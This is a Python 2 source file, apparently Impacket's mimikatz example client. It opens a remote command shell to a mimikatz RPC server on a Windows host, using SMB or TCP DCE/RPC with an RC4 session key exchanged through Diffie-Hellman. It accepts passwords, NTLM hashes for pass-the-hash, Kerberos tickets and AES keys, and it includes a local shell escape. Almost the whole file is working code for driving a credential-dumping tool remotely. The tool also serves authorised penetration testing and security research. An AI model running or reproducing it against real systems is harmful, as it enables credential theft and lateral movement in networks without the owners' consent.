#!/usr/bin/env python
# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description: Mini shell to control a remote mimikatz RPC server developed by @gentilkiwi
#
# Author:
#  Alberto Solino (@agsolino)
#
# Reference for:
#  SMB DCE/RPC 
#

import argparse
import cmd
import logging
import os
import sys

from impacket import version
from impacket.dcerpc.v5 import epm, mimilib
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
from impacket.dcerpc.v5.transport import DCERPCTransportFactory
from impacket.examples import logger

try:
    from Cryptodome.Cipher import ARC4
except Exception:
    logging.critical("Warning: You don't have any crypto installed. You need pycryptodomex")
    logging.critical("See https://pypi.org/project/pycryptodomex/")

# If you wanna have readline like functionality in Windows, install pyreadline
try:
  import pyreadline as readline
except ImportError:
  import readline

class MimikatzShell(cmd.Cmd):
    def __init__(self, dce):
        cmd.Cmd.__init__(self)
        self.shell = None

        self.prompt = 'mimikatz # '
        self.tid = None
        self.intro = '' \
                    '  .#####.   mimikatz RPC interface\n'\
                    ' .## ^ ##.  "A La Vie, A L\' Amour "\n'\
                    ' ## / \ ##  /* * *\n'\
                    ' ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n'\
                    ' \'## v ##\'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)\n'\
                    '  \'#####\'    Impacket client by Alberto Solino (@agsolino)    * * */\n\n'\
                    'Type help for list of commands'
        self.pwd = ''
        self.share = None
        self.loggedIn = True
        self.last_output = None

        self.dce = dce

        dh = mimilib.MimiDiffeH()
        blob = mimilib.PUBLICKEYBLOB()
        blob['y'] = dh.genPublicKey()[::-1]
        publicKey = mimilib.MIMI_PUBLICKEY()
        publicKey['sessionType'] = mimilib.CALG_RC4
        publicKey['cbPublicKey'] = 144
        publicKey['pbPublicKey'] = str(blob)
        resp = mimilib.hMimiBind(self.dce, publicKey)
        blob = mimilib.PUBLICKEYBLOB(''.join(resp['serverPublicKey']['pbPublicKey']))

        self.key = dh.getSharedSecret(''.join(blob['y'])[::-1])[-16:][::-1]
        self.pHandle = resp['phMimi']

    def emptyline(self):
        pass

    def precmd(self,line):
        # switch to unicode
        return line.decode('utf-8')

    def default(self, line):
        if line.startswith('*'):
            line = line[1:]
        command = (line.strip('\n')+'\x00').encode('utf-16le')
        command = ARC4.new(self.key).encrypt(command)
        resp = mimilib.hMimiCommand(self.dce, self.pHandle, command)
        cipherText = ''.join(resp['encResult'])
        cipher = ARC4.new(self.key)
        print cipher.decrypt(cipherText)

    def onecmd(self,s):
        retVal = False
        try:
           retVal = cmd.Cmd.onecmd(self,s)
        except Exception, e:
           #import traceback
           #traceback.print_exc()
           logging.error(e)

        return retVal

    def do_exit(self,line):
        if self.shell is not None:
            self.shell.close()
        return True

    def do_shell(self, line):
        output = os.popen(line).read()
        print output
        self.last_output = output

    def do_help(self,line):
        self.default('::')

def main():
    # Init the example's logger theme
    logger.init()
    print version.BANNER
    parser = argparse.ArgumentParser(add_help = True, description = "SMB client implementation.")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-file', type=argparse.FileType('r'), help='input file with commands to execute in the mini shell')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                       '(KRB5CCNAME) based on target parameters. If valid credentials '
                                                       'cannot be found, it will use the ones specified in the command '
                                                       'line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')

    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in '
                            'the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    import re
    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
        options.target).groups('')

    #In case the password contains '@'
    if '@' in address:
        password = password + '@' + address.rpartition('@')[0]
        address = address.rpartition('@')[2]

    if options.target_ip is None:
        options.target_ip = address

    if domain is None:
        domain = ''
    
    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    bound = False
 
    try:
        if username != '':
            try:
                # Let's try to do everything through SMB. If we'e lucky it might get everything encrypted
                rpctransport = DCERPCTransportFactory(r'ncacn_np:%s[\pipe\epmapper]'%address)
                rpctransport.set_credentials(username, password, domain, lmhash, nthash, options.aesKey)
                dce = rpctransport.get_dce_rpc()
                if options.k:
                    rpctransport.set_kerberos(True, options.dc_ip)
                    dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
                dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
                dce.connect()
                # Give me the endpoint please!
                stringBinding = epm.hept_map(address, mimilib.MSRPC_UUID_MIMIKATZ, protocol = 'ncacn_np', dce=dce)

                # Thanks, let's now use the same SMB Connection to bind to mimi
                rpctransport2 = DCERPCTransportFactory(stringBinding)
                rpctransport2.set_smb_connection(rpctransport.get_smb_connection())
                dce = rpctransport2.get_dce_rpc()
                if options.k:
                    dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
                dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
                dce.connect()
                dce.bind(mimilib.MSRPC_UUID_MIMIKATZ)
                bound = True
            except Exception, e:
                if str(e).find('ept_s_not_registered') >=0:
                    # Let's try ncacn_ip_tcp
                    stringBinding = epm.hept_map(address, mimilib.MSRPC_UUID_MIMIKATZ, protocol = 'ncacn_ip_tcp')
                else:
                    raise

        else:
            stringBinding = epm.hept_map(address, mimilib.MSRPC_UUID_MIMIKATZ, protocol = 'ncacn_ip_tcp')

        if bound is False:
            rpctransport = DCERPCTransportFactory(stringBinding)
            rpctransport.set_credentials(username, password, domain, lmhash, nthash, options.aesKey)
            dce = rpctransport.get_dce_rpc()
            if options.k is True:
                rpctransport.set_kerberos(True, options.dc_ip)
                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
            rpctransport.set_credentials(username, password, domain, lmhash, nthash)
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.connect()
            dce.bind(mimilib.MSRPC_UUID_MIMIKATZ)

        shell = MimikatzShell(dce)

        if options.file is not None:
            logging.info("Executing commands from %s" % options.file.name)
            for line in options.file.readlines():
                if line[0] != '#':
                    print "# %s" % line,
                    shell.onecmd(line)
                else:
                    print line,
        else:
            shell.cmdloop()
    except Exception, e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))

if __name__ == "__main__":
    main()

